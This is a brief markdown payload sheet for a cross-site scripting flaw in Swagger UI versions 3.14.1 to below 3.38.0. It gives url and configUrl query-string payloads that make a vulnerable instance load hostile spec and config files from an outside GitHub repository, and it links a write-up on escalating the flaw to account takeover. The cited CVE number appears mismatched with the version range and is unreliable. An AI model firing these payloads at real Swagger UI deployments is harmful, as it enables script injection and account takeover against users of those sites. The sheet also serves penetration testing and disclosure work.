# Swagger UI >=3.14.1 < 3.38.0 XSS payload

- Swagger UI version affected: `>=3.14.1 < 3.38.0`
- CVE-2016-5682  

## Payloads

### `url`
`?url=https://raw.githubusercontent.com/Outs1d3r-Net/swagger-ui-xss/main/xss-domain.yaml`
`?url=https://raw.githubusercontent.com/Outs1d3r-Net/swagger-ui-xss/main/xss-fetch.yaml`
### `configUrl`

`?configUrl=https://raw.githubusercontent.com/Outs1d3r-Net/swagger-ui-xss/main/config.json`

**More info at**: https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
